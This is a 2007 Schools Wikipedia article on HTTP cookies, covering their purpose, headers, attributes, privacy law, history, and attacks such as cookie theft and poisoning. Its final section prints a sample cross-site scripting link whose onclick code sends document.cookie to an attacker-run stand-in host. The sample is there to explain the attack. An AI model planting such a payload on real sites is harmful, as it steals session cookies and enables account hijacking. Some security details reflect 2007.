@@ -1,0 +1,771 @@
+   #copyright
+
+HTTP cookie
+
+2007 Schools Wikipedia Selection. Related subjects: Websites and the Internet
+
+   HTTP cookies, sometimes known as web cookies or just cookies, are
+   parcels of text sent by a server to a web browser and then sent back
+   unchanged by the browser each time it accesses that server. HTTP
+   cookies are used for authenticating, tracking, and maintaining specific
+   information about users, such as site preferences and the contents of
+   their electronic shopping carts. The term "cookie" is derived from "
+   magic cookie," a well-known concept in Unix computing which inspired
+   both the idea and the name of HTTP cookies.
+
+   Cookies have been of concern for Internet privacy, since they can be
+   used for tracking browsing behaviour. As a result, they have been
+   subject to legislation in various countries such as the United States
+   and in the European Union. Cookies have also been criticised because
+   the identification of users they provide is not always accurate and
+   because they could potentially be used for network attacks. Some
+   alternatives to cookies exist, but each has its own drawbacks.
+
+   Cookies are also subject to a number of misconceptions, mostly based on
+   the erroneous notion that they are computer programs. In fact, cookies
+   are simple pieces of data unable to perform any operation by
+   themselves. In particular, they are neither spyware nor viruses,
+   despite the detection of cookies from certain sites by many
+   anti-spyware products.
+
+   Most modern browsers allow users to decide whether to accept cookies,
+   but rejection makes some websites unusable. For example, shopping
+   baskets implemented using cookies do not work if cookies are rejected.
+
+Purpose
+
+   Cookies are used by Web servers to differentiate users and to operate
+   in a way that depends on the user. Cookies were invented for realising
+   a virtual shopping basket: this is a virtual device in which the user
+   can "place" items to purchase, so that users can navigate a site where
+   items are shown, adding or removing items from the shopping basket at
+   any time. Cookies allow for the content of the shopping cart to depend
+   on the user's actions.
+
+   Allowing users to log in to a website is another use of cookies. Users
+   typically log in by inserting their credentials into a login page;
+   cookies allow the server to know that the user is already
+   authenticated, and therefore is allowed to access services or perform
+   operations that are restricted to logged-in users.
+
+   Several websites also use cookies for personalization based on users'
+   preferences. Sites that require authentication often use this feature,
+   although it is also present on sites not requiring authentication.
+   Personalization includes presentation and functionality. For example,
+   the Wikipedia Web site allows authenticated users to choose the webpage
+   skin they like best; the Google search engine allows users (even
+   non-registered ones) to decide how many search results per page they
+   want to see.
+
+   Cookies are also used to track users across a website. Third-party
+   cookies and Web bugs, explained below, also allow for tracking across
+   multiple sites. Tracking within a site is typically done with the aim
+   of producing usage statistics, while tracking across sites is typically
+   used by advertising companies to produce anonymous user profiles, which
+   are then used to target advertising (deciding which advertising image
+   to show) based on the user profile.
+
+Realization
+
+   Technically, cookies are arbitrary pieces of data chosen by the Web
+   server and sent to the browser. The browser returns them unchanged to
+   the server, introducing a state (memory of previous events) into
+   otherwise stateless HTTP transactions. Without cookies, each retrieval
+   of a Web page or component of a Web page is an isolated event, mostly
+   unrelated to all other views of the pages of the same site. By
+   returning a cookie to a web server, the browser provides the server a
+   means of connecting the current page view with prior page views. Other
+   than being set by a web server, cookies can also be set by a script in
+   a language such as JavaScript, if supported and enabled by the Web
+   browser.
+
+   Cookie specifications suggest that browsers should support a minimal
+   number of cookies or amount of memory for storing them. In particular,
+   an internet browser is expected to be able to store at least 300
+   cookies of 4 kilobytes each, and at least 20 cookies per server or
+   domain.
+
+   The cookie setter can specify a deletion date, in which case the cookie
+   will be removed on that date. If the cookie setter does not specify a
+   date, the cookie is removed once the user quits his browser. As a
+   result, specifying a date is a way for making a cookie survive across
+   sessions. For this reason, cookies with an expiration date are called
+   persistent. As an example application, a shopping site can use
+   persistent cookies to store the items users have placed in their
+   basket. This way, if users quit their browser without making a purchase
+   and return later, they don't have to find the products they previously
+   placed in the shopping cart over again.
+
+Misconceptions
+
+   Since their introduction on the Internet, misconceptions about cookies
+   have circulated on the Internet and in the media. In 2005, Jupiter
+   Research published the results of a survey, according to which a
+   consistent percentage of respondents believed some of the following
+   claims:
+     * Myth: Cookies are like worms and viruses in that they can erase
+       data from the user's hard disks;
+     * Myth: Cookies are a form of spyware in that they can read personal
+       information stored on the user's computer;
+     * Myth: Cookies generate popups;
+     * Myth: Cookies are used for spamming;
+     * Myth: Cookies are only used for advertising.
+
+   Cookies are in fact only data, not program code: they cannot erase or
+   read information from the user's computer. However, cookies allow for
+   detecting the Web pages viewed by a user on a given site or set of
+   sites. This information can be collected in a profile of the user. Such
+   profiles are often anonymous, that is, they do not contain personal
+   information of the user (name, address, etc.) More precisely, they
+   cannot contain personal information unless the user has made it
+   available to some sites. Even if anonymous, these profiles have been
+   the subject of some privacy concerns.
+
+   According to the same survey, a large percentage of Internet users do
+   not know how to delete cookies.
+
+Browser settings
+
+   Most modern browsers support cookies. However, a user can usually also
+   choose whether cookies should be used or not. The following are common
+   options: (1) cookies are never accepted, (2) the browser asks the user
+   whether to accept every individual cookie, or (3) cookies are always
+   accepted.
+   The Firefox Cookie Manager, showing the details of various cookies by
+   domain
+   Enlarge
+   The Firefox Cookie Manager, showing the details of various cookies by
+   domain
+
+   The browser may also include the possibility of better specifying which
+   cookies have to be accepted or not. In particular, the user can
+   typically choose one or more of the following options: reject cookies
+   from specific domains; disallow third-party cookies (see below); accept
+   cookies as non-persistent (expiring when the browser is closed); and
+   allow a server to set cookies for a different domain. Additionally,
+   browsers may also allow users to view and delete individual cookies.
+
+   Most browsers supporting JavaScript allow the user to see the cookies
+   that are active with respect to a given page by typing
+   javascript:alert("Cookies: "+document.cookie) in the browser URL field.
+   Some browsers incorporate a cookie manager for the user to see and
+   selectively delete the cookies currently stored in the browser.
+
+   The P3P specification includes the possibility for a server to state a
+   privacy policy, which specifies which kind of information it collects
+   and for which purpose. These policies include (but are not limited to)
+   the use of information gathered using cookies. According to the P3P
+   specification, a browser can accept or reject cookies by comparing the
+   privacy policy with the stored user preferences or ask the user,
+   presenting them the privacy policy as declared by the server.
+
+Privacy and third-party cookies
+
+   Cookies have some important implications on the privacy and anonymity
+   of Web users. While cookies are only sent to the server setting them or
+   one in the same Internet domain, a Web page may contain images or other
+   components stored on servers in other domains. Cookies that are set
+   during retrieval of these components are called third-party cookies.
+
+   Advertising companies use third-party cookies to track a user across
+   multiple sites. In particular, an advertising company can track a user
+   across all pages where it has placed advertising images or Web bugs.
+   Knowledge of the pages visited by a user allows the advertisement
+   company to target advertisement to the user's presumed preferences.
+
+   The possibility of building a profile of users has been considered by
+   some a potential privacy threat, even when the tracking is done on a
+   single domain but especially when tracking is done across multiple
+   domains using third-party cookies. For this reason, some countries have
+   legislation about cookies.
+
+   The United States government has set strict rules on setting cookies in
+   2000 after it was disclosed that the White House drug policy office
+   used cookies to track computer users viewing its online anti-drug
+   advertising to see if they then visited sites about drug making and
+   drug use. In 2002, privacy activist Daniel Brandt found that the CIA
+   had been leaving persistent cookies on computers for ten years. When
+   notified it was violating policy, CIA stated that these cookies were
+   not intentionally set and stopped setting them. On December 25, 2005,
+   Brandt discovered that the National Security Agency had been leaving
+   two persistent cookies on visitors' computers due to a software
+   upgrade. After being informed, the National Security Agency immediately
+   disabled the cookies.
+
+   The 2002 European Union telecommunication privacy Directive contains
+   rules about the use of cookies. In particular, Article 5, Paragraph 3
+   of this directive mandates that storing data (like cookies) in a user's
+   computer can only be done if: 1) the user is provided information about
+   how this data is used; and 2) the user is given the possibility of
+   denying this storing operation. However, this article also states that
+   storing data that is necessary for technical reasons is exempted from
+   this rule. This directive was expected to have been applied since
+   October 2003, but a December 2004 report says (page 38) that this
+   provision was not applied in practice, and that some member countries
+   (Slovakia, Latvia, Greece, Belgium, and Luxembourg) did not even
+   transpose it. The same report suggests a thorough analysis of the
+   situation in the Member States.
+
+Drawbacks of cookies
+
+   Besides privacy concerns, there are some other reasons why cookies have
+   been opposed: they do not always accurately identify users, and they
+   can be used for security attacks.
+
+Inaccurate identification
+
+   If more than one browser is used on a computer, each has a separate
+   storage area for cookies. Hence cookies do not identify a person, but a
+   combination of a user account, a computer, and a Web browser. Thus,
+   anyone who uses multiple accounts, computers, or browsers has multiple
+   sets of cookies.
+
+   Likewise, cookies do not differentiate between multiple users who share
+   a computer and browser, if they do not use different user accounts.
+
+Cookie theft
+
+   A cookie can be stolen by another computer that is allowed reading from
+   the network
+   Enlarge
+   A cookie can be stolen by another computer that is allowed reading from
+   the network
+
+   During normal operation, cookies are sent back and forth between a
+   server (or a group of servers in the same domain) and the computer of
+   the browsing user. Since cookies may contain sensitive information
+   (user name, a token used for authentication, etc.), their values should
+   not be accessible to other computers. Cookies theft is any process
+   allowing an unauthorised party to receive a cookie.
+
+   Cookies sent on ordinary HTTP sessions are visible to all users who can
+   listen in on the network using a packet sniffer. This problem can be
+   overcome by using the https URI scheme, which invokes Transport Layer
+   Security to encrypt the connection. Additionally, a cookie can be set
+   with the secure flag, which makes it to be sent only over a secure
+   channel, such as an SSL connections.
+   Cross-site scripting: a cookie that should be only exchanged between a
+   server and a client is sent to another party.
+   Enlarge
+   Cross-site scripting: a cookie that should be only exchanged between a
+   server and a client is sent to another party.
+
+   A different way to steal cookies is cross-site scripting, which makes
+   the browser itself to send cookies to servers that should not receive
+   them. Modern browsers allow execution of pieces of code retrieved from
+   the server. If cookies are accessible during execution, their value may
+   be communicated in some form to servers that should not access them.
+   The process allowing an unauthorised party to receive a cookie is
+   called cookie theft, and encryption does not help against this attack..
+
+   This possibility is typically exploited by attackers on sites that
+   allow users to post HTML content. By embedding a suitable piece of code
+   in an HTML post, an attacker may receive cookies of other users.
+   Knowledge of these cookies can then be exploited by connecting to the
+   same site using the stolen cookies, thus being recognised as the user
+   whose cookies have been stolen. A way for preventing such attacks is by
+   the HttpOnly flag; this is a Microsoft-specific option that makes a
+   cookie inaccessible to client side script.
+   Cookie poisoning: an attacker sends a server an invalid cookie,
+   possibly modifying a valid cookie it previously received from the
+   server.
+   Enlarge
+   Cookie poisoning: an attacker sends a server an invalid cookie,
+   possibly modifying a valid cookie it previously received from the
+   server.
+
+Cookie poisoning
+
+   While cookies are supposed to be stored and sent back to the server
+   unchanged, an attacker may modify the value of cookies before sending
+   them back to the server. If, for example, a cookie contains the total
+   value a user has to pay for the items in their shopping basket,
+   changing this value exposes the server to the risk of making the
+   attacker pay less than the supposed price. The process of tampering
+   with the value of cookies is called cookie poisoning, and is sometimes
+   used after cookie theft to make an attack persistent.
+   In cross-site cooking, the attacker exploits a browser bug to send an
+   invalid cookie to a server.
+   Enlarge
+   In cross-site cooking, the attacker exploits a browser bug to send an
+   invalid cookie to a server.
+
+   Most websites, however, only store a session identifier — a randomly
+   generated unique number used to identify the user's session — in the
+   cookie itself, while all the other information is stored on the server.
+   In this case, the problem of cookie poisoning is largely eliminated.
+
+Cross-site cooking
+
+   Each site is supposed to have its own cookies, so a site like evil.net
+   should not be able to alter or set cookies for another site, like
+   good.net. Cross-site cooking vulnerabilities in web browsers allow
+   malicious sites to break this rule. This is similar to cookie
+   poisoning, but the attacker exploits non-malicious users with
+   vulnerable browsers, instead of attacking the actual site directly. The
+   goal of such attacks may be to perform session fixation.
+
+Alternatives to cookies
+
+   Some of the operations that can be realised using cookies can also be
+   realised using other mechanisms. However, these alternatives to cookies
+   have their own drawbacks, which make cookies usually preferred to them
+   in practice. Most of the following alternatives allow for user
+   tracking, even if not as reliably as cookies. As a result, privacy is
+   an issue even if cookies are rejected by the browser or not set by the
+   server.
+
+IP address
+
+   An unreliable technique for tracking users is based on storing the IP
+   addresses of the computers requesting the pages. This technique has
+   been available since the introduction of the World Wide Web, as
+   downloading pages requires the server holding them to know the IP
+   address of the computer running the browser or the proxy, if any is
+   used. This information is available for the server to be stored
+   regardless of whether cookies are used.
+
+   However, these addresses are typically less reliable in identifying a
+   user than cookies because computers and proxies may be shared by
+   several users, and the same computer may be assigned different Internet
+   addresses in different work sessions (this is often the case for
+   dial-up connections). The reliability of this technique can be improved
+   by using another feature of the HTTP protocol: when a browser requests
+   a page because the user has followed a link, the request that is sent
+   to the server contains the URL of the page where the link is located.
+   If the server stores these URLs, the path of page viewed by the user
+   can be tracked more precisely. However, these traces are less reliable
+   than the ones provided by cookies, as several users may access the same
+   page from the same computer, NAT router, or proxy and then follow two
+   different links. Moreover, this technique only allows tracking and
+   cannot replace cookies in their other uses.
+
+   Tracking by IP address can be impossible with some systems that are
+   used to retain Internet anonymity, such as Tor. With such systems, not
+   only could one browser carry multiple addresses throughout a session,
+   but multiple users could appear to be coming from the same IP address,
+   thus making IP address use for tracking wholly unreliable.
+
+   Some major ISPs, including AOL, route all web traffic through a small
+   number of proxies which makes this scheme particularly unworkable.
+
+URL (query string)
+
+   A more precise technique is based on embedding information into URLs.
+   The query string part of the URL is the one that is typically used for
+   this purpose, but other parts can be used as well. The PHP session
+   mechanism uses this method if cookies are not enabled.
+
+   This method consists of the Web server appending query strings to the
+   links of a Web page it holds when sending it to a browser. When the
+   user follows a link, the browser returns the attached query string to
+   the server.
+
+   Query strings used in this way and cookies are very similar, both being
+   arbitrary pieces of information chosen by the server and sent back by
+   the browser. However, there are some differences: since a query string
+   is part of a URL, if that URL is later reused, the same attached piece
+   of information is sent to the server. For example, if the preferences
+   of a user are encoded in the query string of a URL and the user sends
+   this URL to another user by e-mail, those preferences will be used for
+   that other user as well.
+
+   Moreover, even if the same user accesses the same page two times, there
+   is no guarantee that the same query string is used in both views. For
+   example, if the same user arrives to the same page but coming from a
+   page internal to the site the first time and from an external search
+   engine the second time, the relative query strings are typically
+   different while the cookies would be the same. For more details, see
+   query string.
+
+   Other drawbacks of query strings are related to security: storing data
+   that identifies a session in a query string enables or simplifies
+   session fixation attacks, referer logging attacks and other security
+   exploits. Transferring session identifiers as HTTP cookies is more
+   secure.
+
+HTTP authentication
+
+   As for authentication, the HTTP protocol includes mechanisms, such as
+   the digest access authentication, that allow access to a Web page only
+   when the user has provided the correct username and password. Once
+   these credentials are given, the browser stores and uses them also for
+   accessing subsequent pages, without requiring the user to provide them
+   again. From the point of view of the user, the effect is the same as if
+   cookies were used: username and password are only requested once, and
+   from that point on the user is given access to the site. In the
+   background, the username and password combination is sent to the server
+   in every browser request. This means that someone listening in on this
+   traffic, can simply read this information and store for later use.
+   Session tokens on the other hand, usually expire after not having been
+   used for a while, and thus effectively become useless (i.e. they cannot
+   be used to retrieve the session in which the user was logged-in).
+
+Client-Side Persistence
+
+   Some web browsers support a script-based persistence mechanism that
+   allows the page to store information locally for later retrieval.
+   Internet Explorer, for example, supports persisting information in the
+   browser's history, in favorites, in an XML store, or directly within a
+   Web page saved to disk.
+
+   If JavaScript is enabled, the window.name property of the object window
+   can be used to persistently store data. This property remains unaltered
+   across the loading and unloading of other web pages. This hack is
+   little known, and has therefore not been considered a security risk.
+   Additionally, window.name introduces browser compatibility issues, as
+   Mozilla-based browsers such as Mozilla Firefox do not support
+   JavaScript persistence using window.name.
+
+History
+
+   The term "HTTP cookie" derives from " magic cookie", a packet of data a
+   program receives but only uses for sending it again, possibly to its
+   origin, unchanged. Magic cookies were already used in computing when
+   Lou Montulli had the idea of using them in Web communications in June
+   1994. At the time, he was an employee of Netscape Communications, which
+   was developing an e-commerce application for a customer. Cookies
+   provided a solution to the problem of reliably implementing a virtual
+   shopping cart.
+
+   Together with John Giannandrea, Montulli wrote the initial Netscape
+   cookie specification the same year. Version 0.9beta of Netscape,
+   released on September 1994, supported cookies. The first actual use of
+   cookies (out of the labs) was made for checking whether visitors to the
+   Netscape Web site had already visited the site. Montulli and
+   Giannandrea applied for a patent for the cookie technology in 1995; it
+   was granted in 1998. Support for cookies was integrated in Internet
+   Explorer in version 2, released in October 1995.
+
+   The introduction of cookies was not widely known to the public, at the
+   time. In particular, cookies were accepted by default, and users were
+   not notified of the presence of cookies. Some people were aware of the
+   existence of cookies as early as the first quarter of 1995, but the
+   general public learned about them after the Financial Times published
+   an article about them on February 12, 1996. In the same year, cookies
+   received lot of media attention, especially because of potential
+   privacy implications. Cookies were discussed in two U.S. Federal Trade
+   Commission hearings in 1996 and 1997.
+
+   The development of the formal cookie specifications was already
+   ongoing. In particular, the first discussions about a formal
+   specification started in April 1995 on the www-talk mailing list. A
+   special working group within the IETF was formed. Two alternative
+   proposals for introducing a state in an HTTP transactions had been
+   proposed by Brian Behlendorf and David Kristol, respectively, but the
+   group, headed by Kristol himself, soon decided to use the Netscape
+   specification as a starting point. On February 1996, the working group
+   identified third-party cookies as a considerable privacy threat. The
+   specification produced by the group was eventually published as RFC
+   2109 in February 1997. It specifies that third-party cookies were
+   either not allowed at all, or at least not enabled by default.
+
+   At this time, advertising companies were already using third-party
+   cookies. The recommendation about third-party cookies of RFC 2109 was
+   not followed by Netscape and Internet Explorer. RFC 2109 was followed
+   by RFC 2965 in October 2000.
+
+Implementation
+
+Setting a cookie
+
+   Transfer of Web pages follows the HyperText Transfer Protocol (HTTP).
+   Regardless of cookies, browsers request a page from web servers by
+   sending them a short text called HTTP request. For example, to access
+   the page http://www.w3.org/index.html, browsers connect to the server
+   www.w3.org sending it a request that looks like the following one:
+
+           GET /index.html HTTP/1.1
+   browser
+
+                                             →
+
+                                        server
+
+   The server replies by sending the requested page preceded by a similar
+   packet of text, called HTTP header. This packet may contain lines
+   requesting the browser to store cookies:
+
+           HTTP/1.1 200 OK
+           Content-type: text/html
+           Set-Cookie: name=value
+
+           (content of page)
+   browser
+
+                                             ←
+
+                                        server
+
+   The line Set-cookie is only sent if the server wishes the browser to
+   store a cookie. Indeed, it is a request for the browser to store the
+   string name=value and send it back in all future requests to the
+   server. If the browser supports cookies and cookies are enabled, every
+   subsequent page request to the same server contains the cookie. For
+   example, the browser requests the page http://www.w3.org/spec.html by
+   sending the server www.w3.org a request like the following:
+
+           GET /spec.html HTTP/1.1
+           Cookie: name=value
+           Accept: */*
+
+   browser
+
+                                             →
+
+                                        server
+
+   This is a request for another page from the same server, and differs
+   from the first one above because it contains the string that the server
+   has previously sent to the browser. This way, the server knows that
+   this request is related to the previous one. The server answers by
+   sending the requested page, possibly adding other cookies as well.
+
+   The value of a cookie can be modified by the server by sending a new
+   Set-Cookie: name=newvalue line in response of a page request. The
+   browser then replaces the old value with the new one.
+
+   The Set-Cookie line is typically not created by the HTTP server itself
+   but by a CGI program. The HTTP server only sends the result of the
+   program (a document preceded by the header containing the cookies) to
+   the browser.
+
+   Cookies can also be set by JavaScript or similar scripts running within
+   the browser. In JavaScript, the object document.cookie is used for this
+   purpose. For example, the instruction document.cookie =
+   "temperature=20" creates a cookie of name temperature and value 20.
+
+Cookie attributes
+
+   Beside the name/value pair, a cookie may also contain an expiration
+   date, a path, a domain name, and whether the cookie is intended only
+   for encrypted connections. RFC 2109 also specifies that cookies must
+   have a mandatory version number, but this is usually omitted. These
+   pieces of data follow the name=newvalue pair and are separated by
+   semicolons. For example, a cookie can be created by the server by
+   sending a line Set-Cookie: name=newvalue; expires=date; path=/;
+   domain=.example.org.
+   Example of an HTTP response from google.com, which sets a cookie with
+   attributes.
+   Enlarge
+   Example of an HTTP response from google.com, which sets a cookie with
+   attributes.
+
+   The domain and path tell the browser that the cookie has to be sent
+   back to the server when requesting URLs of a given domain and path. If
+   not specified, they default to the domain and path of the object that
+   was requested. As a result, the domain and path strings may tell the
+   browser to send the cookie when it normally would not. For security
+   reasons, the cookie is accepted only if the server is a member of the
+   domain specified by the domain string.
+
+   Cookies are actually identified by the triple name/domain/path, not
+   only the name (the original Netscape specification considers only the
+   pair name/path). In other words, same name but different domains or
+   paths identify different cookies with possibly different values. As a
+   result, cookie values are changed only if a new value is given for the
+   same name, domain, and path.
+
+   The expiration date tells the browser when to delete the cookie. If no
+   expiration date is provided, the cookie is deleted at the end of the
+   user session, that is, when the user quits the browser. As a result,
+   specifying an expiration date is a means for making cookies to survive
+   across browser sessions. For this reason, cookies that have an
+   expiration date are called persistent.
+
+   The expiration date is specified in the "Wdy, DD-Mon-YYYY HH:MM:SS GMT"
+   format. As an example, the following is a cookie sent by a Web server
+   (the value string has been changed):
+
+   Set-Cookie: RMID=732423sdfs73242; expires=Fri, 31-Dec-2010 23:59:59
+   GMT; path=/; domain=.example.net
+
+   The name of this particular cookie is RMID, while its value is the
+   string 732423sdfs73242. The server can use an arbitrary string as the
+   value of a cookie. The server may collapse the value of a number of
+   variables in a single string, like for example a=12&b=abcd&c=32. The
+   path and domain strings / and .example.net tell the browser to send the
+   cookie when requesting an arbitrary page of the domain .example.net,
+   with an arbitrary path.
+
+Expiration
+
+   Cookies expire, and are therefore not sent by the browser to the
+   server, under these conditions:
+    1. At the end of the user session (i.e. when the browser is shut down)
+       if the cookie is not persistent
+    2. An expiration date has been specified, and has passed
+    3. The expiration date of the cookie is changed (by the server or the
+       script) to a date in the past
+    4. The browser deletes the cookie by user request
+
+   The third condition allows a server or script to explicitly delete a
+   cookie.
+
+Authentication
+
+   Cookies can be used by a server to recognize authenticated users and to
+   personalize the web pages of a site depending on the preferences of a
+   user. This can be done for example as follows:
+    1. The user inserts username and password in the text fields of a
+       login page and sends them to the server;
+    2. The server receives username and password and checks them; if
+       correct, it sends back a page confirming that logging has been
+       successful together with a cookie, storing the pair user/cookie (or
+       just the cookie);
+    3. Every time the user requests a page from the server, the browser
+       automatically sends the cookie back to the server; the server
+       compares the cookie with the stored ones; if a match is found, the
+       server knows which user has requested that page.
+
+   This is the method commonly used by many sites that allow logging in,
+   such as Yahoo! and Wikipedia.
+
+Personalization
+
+   Cookies can be used for allowing users to express preferences about a
+   Web site. For example, the Google search engine allows the user to
+   choose how many results are to be shown for every query, and this
+   choice is maintained across sessions.
+
+   If a user was authenticated using the technique above, when they
+   request a page the server is also sent the cookie associated with the
+   user. It can therefore adapt the requested page to the stored used
+   preferences. When authentication is not used, the user preferences are
+   stored in a cookie. The users select their preference by entering them
+   in a Web form and submitting it to the server. The server encodes them
+   in a cookie and sends it back to the browser. This way, every time the
+   user accesses a page, the server is also sent the cookie where the
+   preferences are stored, and can personalise the page according to the
+   user preferences.
+
+   For example, Google stores the user preferences in a cookie of name
+   PREF. This cookie is created with default values when the user accesses
+   the site for the first time. For example, the cookie value contains the
+   string NR=10, that indicates a default preference of ten hits displayed
+   in each page. If the user changes this number to 20 in the preference
+   page, the server modifies the cookie with NR=20. Every time the user
+   queries the search engine, the cookie is sent to the server along with
+   the query. This way, the server knows how many hits should be shown in
+   each page.
+
+Tracking
+
+   Cookies can also be used for tracking the path of a user while visiting
+   the web pages of a site. This can also be done in part by using the IP
+   address of the computer requesting the page or the referer field of the
+   HTTP header, but cookies allows for a greater precision. This can be
+   done for example as follows:
+    1. If the user requests a page of the site, but the request contains
+       no cookie, the server presumes that this is the first page visited
+       by the user; the server creates a random string and sends it as a
+       cookie back to the browser together with the requested page;
+    2. From this point on, the cookie will be automatically sent by the
+       browser to the server every time a new page from the site is
+       requested; the server sends the page as usual, but also store the
+       URL of the requested page along with the date/time and the cookie
+       in a log file.
+
+   By looking at the log file, it is then possible to find out which
+   pages, and in which sequence, the user has visited. For example, if the
+   log contains some requests done using the cookie id=dfhsiw, these
+   requests all come from the same user. The URL and time/date stored with
+   the cookie allows finding out which pages the user has visited, and at
+   which time.
+
+Third-party cookies
+
+   Images or other objects contained in a Web page may reside in servers
+   different from the one holding the page. In order to show such a page,
+   the browser downloads all these objects, possibly receiving cookies.
+   These cookies are called third-party cookies if the server sending them
+   is located outside the domain of the Web page.
+
+   This condition is common with on-line advertisement. Indeed, web
+   banners are typically stored in servers of the advertising company,
+   which are not in the domain of the Web pages showing them. If
+   third-party cookies are not rejected by the browser, an advertising
+   company can track a user across the sites where it has placed a banner.
+   In particular, whenever a user views a page containing a banner, the
+   browser retrieves the banner from a server of the advertising company.
+   If this server has previously set a cookie, the browser sends it back,
+   allowing the advertising company to link this access with the previous
+   one. By choosing a unique banner URL for every Web page where it is
+   placed or by using the HTTP referer field, the advertising company can
+   then find out which pages the user has viewed. The same technique can
+   be used with web bugs. These, unlike the obvious banners, are images
+   embedded in the Web page that are undetectable by the user (e.g. they
+   are tiny and/or transparent)
+
+   Third-party cookies are used to create an anonymous profile of the
+   user. This allows the advertising company to select the banner to show
+   to a user based on the user's profile. The advertising industry has
+   always denied any other use of these profiles.
+
+   Many modern browsers, such as Internet Explorer, Opera and Mozilla
+   Firefox, block third party cookies if requested by the user. Internet
+   Explorer version 6 allowes a mild form of blocking, called leashing. A
+   leashed cookie is a third-party cookie that is sent by the browser only
+   when accessing a third-party document via the same first-party. For
+   example, if third.com sets a cookie when an image is requested, and
+   this image is set for the first time when the user views a document
+   from first.com, the same cookie is not sent if the user downloads a
+   document that contains the same image but the document is on another
+   site other.com, if the cookie is leashed. A leashed cookie is different
+   from a blocked cookie in that it is sent, in this example, if the image
+   is contained in another document from the same site first.com.
+
+Basket
+
+   Some online shopping sites allow a user, even when not logged in, to
+   store a number of items in a "virtual basket". The user starts
+   navigating the site with an empty basket, and can add items to the
+   basket while visiting the site. The list of items the user has chosen
+   can be stored using cookies. For example, the server sends an empty
+   cookie to the browser when the user visits the first page; whenever the
+   user adds an item to the basket, the server adds the name of the item
+   to the cookie.
+
+   This is a very insecure mechanism, because a malicious user can alter
+   the cookie; a much more secure mechanism is to generate a random cookie
+   as under "tracking", and using that as a lookup key in a database
+   stored on the server.
+
+Cookie theft
+
+   The cookie specifications constrain cookies to be sent back only to the
+   servers in the same domain as the server from which they originate.
+   However, the value of cookies can be sent to other servers using means
+   different from the Cookie header.
+
+   In particular, scripting languages such as JavaScript and JScript are
+   usually allowed access to cookie values and have some means to send
+   arbitrary values to arbitrary servers on the Internet. These facts are
+   used in combination with sites allowing users to post HTML content that
+   other users can see.
+
+   As an example, an attacker running the domain example.com may post a
+   comment containing the following link to a popular blog they do not
+   otherwise control:
+
+          <a href="#"
+          onclick="window.location='http://example.com/stole.cgi?text='+es
+          cape(document.cookie); return false;">Click here!</a>
+
+   When another user clicks on this link, the browser executes the piece
+   of code within the onclick attribute, thus replacing the string
+   document.cookie with the list of cookies that are active for the page.
+   As a result, this list of cookies is sent to the example.com server,
+   and the attacker is then able to collect the cookies of other users.
+
+   This type of attack is difficult to detect on the user side, since the
+   script is coming from the same domain that has set the cookie, and the
+   operation of sending the value appears to be authorised by this domain.
+   It is usually considered the responsibility of the administrators
+   running sites where users can post to disallow the posting of such
+   malicious code.
+   Retrieved from " http://en.wikipedia.org/wiki/HTTP_cookie"
+   This reference article is mainly selected from the English Wikipedia
+   with only minor checks and changes (see www.wikipedia.org for details
+   of authors and sources) and is available under the GNU Free
+   Documentation License. See also our Disclaimer.
